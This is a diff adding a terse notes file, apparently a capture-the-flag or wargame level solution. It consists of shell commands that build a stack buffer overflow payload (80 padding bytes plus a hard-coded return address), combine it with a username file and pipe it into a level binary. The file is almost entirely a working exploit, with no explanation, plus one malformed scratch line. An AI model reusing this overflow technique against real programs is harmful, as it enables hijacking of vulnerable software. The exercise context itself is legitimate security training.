@@ -1,0 +1,7 @@
+eggcode
+
+python -c 'print "A" * 80 + "\xe2\xd8\xff\xff"' > /tmp/test
+cat /tmp/username /tmp/test > /tmp/testtest
+cat /tmp/username = dat_will
+
+cat /tmp/testtest   |  /home/users/level01/level01
